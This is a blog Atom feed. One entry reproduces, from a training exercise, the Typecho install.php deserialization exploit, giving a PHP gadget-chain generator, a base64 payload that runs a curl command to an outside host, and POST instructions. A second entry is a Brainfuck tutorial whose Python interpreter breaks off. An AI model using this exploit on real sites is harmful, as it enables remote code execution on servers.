<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风不及你甜</title>
  
  <subtitle>迷迷糊糊才是真</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-20T07:46:44.048Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>wdraemv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Typecho反序列化</title>
    <link href="http://example.com/2021/09/20/typecho/"/>
    <id>http://example.com/2021/09/20/typecho/</id>
    <published>2021-09-20T07:36:53.000Z</published>
    <updated>2021-09-20T07:46:44.048Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Typecho反序列化导致前台-getshell-漏洞复现"><a href="#Typecho反序列化导致前台-getshell-漏洞复现" class="headerlink" title="Typecho反序列化导致前台 getshell 漏洞复现"></a>Typecho反序列化导致前台 getshell 漏洞复现</h1><p>今天校内的AWD训练，遇到了Typecho的框架</p><p>第一个是__toString()魔法方法，在/install.php  __toString() //把类当作字符串使用时触发</p><p><img src="/2021/09/20/typecho/1.PNG" alt="1"></p><p>找到文章后马上就把自己的install.php删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> RSS1 = <span class="string">&#x27;RSS 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> RSS2 = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> ATOM1 = <span class="string">&#x27;ATOM 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_RFC822 = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> DATE_W3CDTF = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> EOL = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="keyword">$this</span>::RSS2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;link&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;date&#x27;</span> =&gt; <span class="number">1508895132</span>,</span><br><span class="line">            <span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span> =&gt; <span class="keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> Typecho_Feed(),</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过php跑出了一长串 的字符，利用这个可以成功回显php页面，修改phpinfo为systeam(需要输入的命令)</p><p>得到YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjY2OiJzeXN0ZW0oImN1cmwgMTAuMTIwLjExNS4xMC9pbmRleC5waHA/dG9rZW49NjVfVVNSLTIwMjEwOTE5LXBjbk50IikiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX1zOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo2Njoic3lzdGVtKCJjdXJsIDEwLjEyMC4xMTUuMTAvaW5kZXgucGhwP3Rva2VuPTY1X1VTUi0yMDIxMDkxOS1wY25OdCIpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==</p><p>用post提交数据</p><p>url：<a href="http://1172.31.65.183/install.php?finish=">http://1172.31.65.183/install.php?finish=</a></p><p>Postdata：__typecho_config=前面脚本生成的</p><p>Referrer：<a href="http://192.168.198.128/">http://192.168.198.128</a></p><p><img src="/2021/09/20/typecho/111.PNG" alt="111"></p><p>成功</p><p><img src="/2021/09/20/typecho/11.PNG" alt="11"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Typecho反序列化导致前台-getshell-漏洞复现&quot;&gt;&lt;a href=&quot;#Typecho反序列化导致前台-getshell-漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;Typecho反序列化导致前台 getshell 漏洞复现&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>brainfuck</title>
    <link href="http://example.com/2021/09/17/brainfuck/"/>
    <id>http://example.com/2021/09/17/brainfuck/</id>
    <published>2021-09-17T07:21:49.000Z</published>
    <updated>2021-09-17T07:45:31.311Z</updated>
    
    <content type="html"><![CDATA[<p>比赛做题的时候刚好遇到了这个语言，感觉非常的有意思，用8种字符就可以运算出来程序，学习一下</p><h1 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h1><p>Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf*ck或brainf**k，甚至被简称为BF。</p><h2 id="一，指令"><a href="#一，指令" class="headerlink" title="一，指令"></a>一，指令</h2><p>BF只有8种有效字符，其实就是8种指令：</p><table><thead><tr><th>Command</th><th>Explanation</th></tr></thead><tbody><tr><td>+</td><td>指针指向的字节的值加一</td></tr><tr><td>-</td><td>指针指向的字节的值减一</td></tr><tr><td>&gt;</td><td>指针加一</td></tr><tr><td>&lt;</td><td>指针减一</td></tr><tr><td>.</td><td>输出指针指向的单元内容（ASCⅡ码）</td></tr><tr><td>,</td><td>输入内容到指针指向的单元（ASCⅡ码）</td></tr><tr><td>[</td><td>如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</td></tr><tr><td>]</td><td>如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处</td></tr></tbody></table><h2 id="二，代码理解"><a href="#二，代码理解" class="headerlink" title="二，代码理解"></a>二，代码理解</h2><p>BF可以简单的翻译成C/C++语言：</p><p><img src="https://img-blog.csdnimg.cn/20201129015806945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25hbWVvZmNzZG4=,size_16,color_FFFFFF,t_70" alt="img"></p><p>Hello world 程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">++++将单元格0设置为8</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">+++将4添加到单元格1；这将始终将单元格1设置为4</span></span><br><span class="line"></span><br><span class="line">[由于该单元将被循环清除</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">++将4*2添加到单元格<span class="comment">#2</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">+++将4*3添加到单元格<span class="comment">#3</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">+++将4*3添加到单元格<span class="comment">#4</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">+将4添加到单元格<span class="comment">#5</span></span></span><br><span class="line"></span><br><span class="line">&lt;&lt;&lt;-减少单元1中的循环计数器</span><br><span class="line"></span><br><span class="line">]循环直到单元格#1为零</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">将1添加到单元格<span class="comment">#2</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">+将1添加到单元格<span class="comment">#3</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">从单元格4中减去1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;+将1添加到单元格<span class="comment">#6</span></span></span><br><span class="line"></span><br><span class="line">[&lt;]移回找到的第一个零单元格；这将</span><br><span class="line"></span><br><span class="line">被上一个循环清除的be单元#1</span><br><span class="line"></span><br><span class="line">&lt;-减少单元0中的循环计数器</span><br><span class="line"></span><br><span class="line">]循环直到单元格#0为零</span><br><span class="line"></span><br><span class="line">其结果是：</span><br><span class="line"></span><br><span class="line">单元格编号：01 2 3 4 5 6</span><br><span class="line"></span><br><span class="line">目录：0 72 104 88 32 8</span><br><span class="line"></span><br><span class="line">指针：^</span><br><span class="line"></span><br><span class="line"><span class="meta"> &gt;</span><span class="bash">&gt;. 单元格2的值为72，即“H”</span></span><br><span class="line"></span><br><span class="line"><span class="meta"> &gt;</span><span class="bash">---. 从单元格<span class="comment">#3中减去3得到101，即“e”</span></span></span><br><span class="line"></span><br><span class="line"> +++++ ++..+++. 第3单元的“llo”也是如此</span><br><span class="line"></span><br><span class="line"><span class="meta"> &gt;</span><span class="bash">&gt;. 5号单元格的空格为32</span></span><br><span class="line"></span><br><span class="line"> &lt;-. 从单元格#4中减去1，得到87的“W”</span><br><span class="line"></span><br><span class="line"> &lt;. 从“Hello”结尾起，第3单元被设置为“o”</span><br><span class="line"></span><br><span class="line"> +++.----- -.----- ---. 单元格#3表示“rl”和“d”</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;+. 将1添加到单元格<span class="comment">#5会给我们一个感叹号</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">++. 最后是第6单元的换行</span></span><br></pre></td></tr></table></figure><p>推荐网站：<a href="https://fatiherikli.github.io/brainfuck-visualizer/#">https://fatiherikli.github.io/brainfuck-visualizer/#</a></p><p><img src="/2021/09/17/brainfuck/1.PNG" alt="1"></p><p>通过指针可视化，更好的理解代码</p><h2 id="三，Brainfuck语言-解释器"><a href="#三，Brainfuck语言-解释器" class="headerlink" title="三，Brainfuck语言 解释器"></a>三，Brainfuck语言 解释器</h2><p>c++</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> code=<span class="string">&quot;...put BF code here...&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *p = arr;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="built_in">string</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pcode=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(pcode&lt;s.length())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span>(s[pcode])</span><br><span class="line">        &#123;        </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">                p++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">                p--;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                *p = *p + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                *p = *p - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span>(*p);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">                *p=getchar();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">int</span> num=<span class="number">1</span>, pend=pcode;</span><br><span class="line">                    <span class="keyword">while</span>(num)</span><br><span class="line">                    &#123;</span><br><span class="line">                        pend++;</span><br><span class="line">                        <span class="keyword">if</span>(s[pend]==<span class="string">&#x27;[&#x27;</span>)num++;</span><br><span class="line">                        <span class="keyword">if</span>(s[pend]==<span class="string">&#x27;]&#x27;</span>)num--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">string</span> ss=s.substr(pcode+<span class="number">1</span>,pend-pcode<span class="number">-1</span>);</span><br><span class="line">                    <span class="keyword">while</span>(*p)run(ss);</span><br><span class="line">                    pcode=pend;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pcode++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    run(code);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> cs</span><br><span class="line"><span class="keyword">global</span> ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> ss</span><br><span class="line"><span class="comment">#global sp</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> ds</span><br><span class="line"><span class="keyword">global</span> bp</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> tab</span><br><span class="line"><span class="keyword">global</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs=<span class="string">&#x27;++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.&#x27;</span></span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line">print(<span class="built_in">len</span>(cs))</span><br><span class="line">ss = []</span><br><span class="line"><span class="comment">#sp = 0</span></span><br><span class="line"></span><br><span class="line">ds = []</span><br><span class="line">bp = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">tab = <span class="number">0</span></span><br><span class="line">out = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tab_</span>():</span></span><br><span class="line">    i = tab</span><br><span class="line">    stab = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">        stab += <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> stab</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">var</span>):</span></span><br><span class="line">    <span class="keyword">global</span> ss</span><br><span class="line">    ss.append(var)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ss</span><br><span class="line">    <span class="keyword">return</span> ss.pop()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_inc_val</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        op = cs[ip]            </span><br><span class="line">        ip = ip + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    l = <span class="built_in">len</span>(ds)</span><br><span class="line">    <span class="keyword">if</span> l &lt;= bp:</span><br><span class="line">        ds.append(<span class="number">0</span>)</span><br><span class="line">    old = ds[bp]</span><br><span class="line">    old += count</span><br><span class="line">    ds[bp] = old</span><br><span class="line">    <span class="built_in">print</span> (tab_()+<span class="string">&#x27;ds[%d] += %d                  (%d)&#x27;</span>%(bp, count, old))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_dec_val</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ip    </span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        op = cs[ip]            </span><br><span class="line">        ip = ip + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> op == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            count = count + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    old = ds[bp]</span><br><span class="line">    old -= count</span><br><span class="line">    ds[bp] = old</span><br><span class="line">    <span class="built_in">print</span> (tab_()+<span class="string">&#x27;ds[%d] -= %d                  (%d)&#x27;</span>%(bp, count, old))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_inc_dp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> bp</span><br><span class="line">    bp = bp + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_dec_dp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> bp</span><br><span class="line">    bp = bp - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_jmp_fwd</span>():</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    <span class="built_in">print</span> (tab_()+<span class="string">&#x27;while ds[%d]=%d:&#x27;</span>%(bp, ds[bp]))</span><br><span class="line">    tab=tab + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ds[bp] != <span class="number">0</span>:</span><br><span class="line">        curip = ip - <span class="number">1</span></span><br><span class="line">        push(curip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = <span class="number">1</span>; </span><br><span class="line">        <span class="keyword">while</span> c &gt; <span class="number">0</span>:</span><br><span class="line">            op = cs[ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">                c += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">                c -= <span class="number">1</span></span><br><span class="line">            ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_jmp_bck</span>():</span></span><br><span class="line">    <span class="keyword">global</span> tab</span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    tab = tab - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ds[bp] != <span class="number">0</span>:</span><br><span class="line">        ip = pop()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_out</span>():</span></span><br><span class="line">    <span class="built_in">print</span> (tab_()+<span class="string">&#x27;putchar(ds[%d])                  (%d)&#x27;</span>%(bp, ds[bp]))</span><br><span class="line">    out.append(ds[bp])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op_in</span>():</span></span><br><span class="line">    <span class="built_in">print</span> (tab_()+<span class="string">&#x27;getchar&#x27;</span>)</span><br><span class="line"></span><br><span class="line">end = <span class="built_in">len</span>(cs)</span><br><span class="line"><span class="keyword">while</span> ip &lt; end:</span><br><span class="line">    op = cs[ip]</span><br><span class="line">    ip = ip + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        ip = ip - <span class="number">1</span></span><br><span class="line">        op_inc_val()</span><br><span class="line">        ip = ip - <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        ip = ip - <span class="number">1</span></span><br><span class="line">        op_dec_val()</span><br><span 